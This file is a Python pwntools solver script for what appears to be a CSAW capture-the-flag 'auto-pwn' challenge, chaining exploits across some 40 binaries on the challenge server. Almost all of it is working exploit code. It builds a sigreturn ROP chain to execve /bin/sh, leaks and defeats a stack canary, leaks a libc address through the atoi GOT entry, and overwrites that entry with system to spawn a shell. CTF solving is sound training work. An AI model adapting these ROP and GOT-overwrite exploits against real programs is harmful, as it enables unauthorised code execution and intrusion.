## NOTE TO PEOPLE USING THIS SOLVER SCRIPT: 
## If you're running this script locally, the 
## easiest way to get it to work (on linux) is to go into 
## /etc/hosts and add the following line:
##
## 127.0.1.1	auto-pwn.chal.csaw.io
##
## Comment this line out after you're done with the script.

from pwn import *
from time import * 
from generic_solver_functions import *

context.os = 'linux'
context.arch = 'amd64'
initial_command = b'nc auto-pwn.chal.csaw.io 11001'
#initial_command = b'nc localhost 11001'
initial_password = open("../first_password.txt", "r").readlines()[0].strip().encode()
context.timeout = 5 

def solve_level_one(p, path_to_binary):
    context.os = 'linux'
    context.arch = 'amd64'
    #path_to_binary = os.path.dirname(os.path.abspath(__file__)) + "/" + path_to_binary
    e = ELF(path_to_binary)
    rop = ROP(e)
    #p.sendline()
    p.recvuntil("Main is at ")
    main_addr = str(p.recvline())[2:-3]
    main = e.symbols['main']
    #print("main address", hex(int(main_addr, 16)))
    #print("main rop", hex(main))
    base_addr = int(main_addr, 16) - main
    #print("base address", hex(base_addr))
    padding = b'A' * 0x9 
    binsh = int(next(e.search(b"/bin/sh\x00"))) + base_addr
    syscall = int(rop.syscall.address) + base_addr
    pop_rax = int(rop.rax.address) + base_addr
    #print("syscall:", hex(syscall))
    #print("syscall rop:", hex(rop.syscall.address))
    #print("pop_rax:", hex(pop_rax))
    #print("pop_rax rop:", hex(rop.rax.address))
    payload = padding + p64(pop_rax) + p64(0xf) + p64(syscall)
    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = binsh
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rip = syscall
    payload += bytes(frame)
    #print(payload)
    p.sendline(payload)
    #p.interactive()

def solve_level_two(p, path_to_binary):
    def write_name(index, name_length, name):
        p.send("1\n")
        p.recvuntil("Please enter the shirt you want to edit (1 or 2): ")
        p.send(str(index)+"\n")
        p.recvuntil("How long is your hacker name? ")
        p.send(str(name_length)+"\n")
        p.recvuntil("Please enter the hacker name: ")
        p.send(name+b"\n")

    def view_shirt(index):
        p.send("2\n")
        p.recvuntil("Please enter the shirt you want to read (1 or 2): ")
        p.send(str(index)+"\n")
        p.recvuntil("reads: ")
        content = p.recvuntil("\n")
        return(content)

    def get_shell():
        p.send("2\n")
        p.recvuntil("Please enter the shirt you want to read (1 or 2): ")
        p.send("/bin/sh\n")
        #p.interactive()
        
    def retrieve_canary(e):
        addr = e.symbols['canary']
        return e.read(addr, 16)

    def retrieve_RESERVEDAMOUNT2(e):
        init_addr = e.symbols['initializeShirts']
        disasm = str(e.disasm(init_addr, 220))
        res = disasm.split('call')[4].split('\n')[3].split(',')[1].strip()
        return int(res,16)

    def custom_shirt_struct(e):
        init_addr = e.symbols['initializeShirts']
        disasm = str(e.disasm(init_addr, 220))
        res = disasm.split('call')[1]#.split('\n')[3].split(',')[1].strip()
        if "rax, 0x8" in res:
            return 0
        else:
            return 48
        
        
    path_to_libc = './libc-2.24.so'
    binary_e = ELF(path_to_binary)
    libc_e = ELF(path_to_libc)

    ATOI_GOT_ADDR = binary_e.got['atoi'] # address of atoi
    ATOI_OFFSET = libc_e.symbols['atoi']
    SYSTEM_OFFSET = libc_e.symbols['system']
    print("atoi got addr: " + hex(int(ATOI_GOT_ADDR)))
    
    NAMELENGTH = 32
    RESERVEDAMOUNT = custom_shirt_struct(binary_e) 
    RESERVEDAMOUNT2 = retrieve_RESERVEDAMOUNT2(binary_e)
    canary = retrieve_canary(binary_e)
    print("canary = " + str(canary))
    print("RESERVEDAMOUNT2 = " + str(RESERVEDAMOUNT2))

    leak_got_payload = b"A"*(NAMELENGTH+16+RESERVEDAMOUNT2)+ canary + b"A"*(8 + RESERVEDAMOUNT)
    align = 16 - (len(leak_got_payload) % 16)
    if align != 16:
        leak_got_payload += b"A"*align
    print("payload len: "+str(len(leak_got_payload)))
    leak_got_payload += p64(ATOI_GOT_ADDR) #still has problem
    print(b"leak_got_payload = " + leak_got_payload)
    write_name(index=1, name_length=300, name=leak_got_payload)
    got_addr_str = view_shirt(2).strip()
    print(b"shirt 2 = " +got_addr_str)
    got_addr_str += b'\x00'*(8-len(got_addr_str)) # pad with null bytes
    GOT_ADDR = u64(got_addr_str)
    print("leaked addr: " + hex(GOT_ADDR))

    LIBC_BASE = GOT_ADDR - ATOI_OFFSET 
    LIBC_SYSTEM_ADDR = LIBC_BASE + SYSTEM_OFFSET

    print("libc system address = " + hex(LIBC_SYSTEM_ADDR))
    write_name(index=2, name_length=20, name=p64(LIBC_SYSTEM_ADDR))

    get_shell()
    #p.interactive()

i = 1
N = 40 
level_two_threshold = 21
password = initial_password
command = initial_command

#command = b'nc localhost 9001' #b'./binary_1_copy'

#context.terminal = ['tmux','splitw','-h'] 
#command = "/root/challenge/binaries/round_1/binary_1"
#gdb.attach(proc.pidof(p)[0])

retry_time = 0
while (i < N):
    try:
        if i < level_two_threshold:
            command, password = exploit_intermediate_binary(command, password, i, solve_level_one)
        else:
            command, password = exploit_intermediate_binary(command, password, i, solve_level_two)
        print("round " + str(i) + " solved!")
        i += 1
    except Exception as e:
        if retry_time > 100:
            print("exceed max retry time, exit.")
            exit(0)
        log.info(str(e)+", retrying...")
        retry_time += 1
exploit_final_binary(command, password, N, solve_level_two)
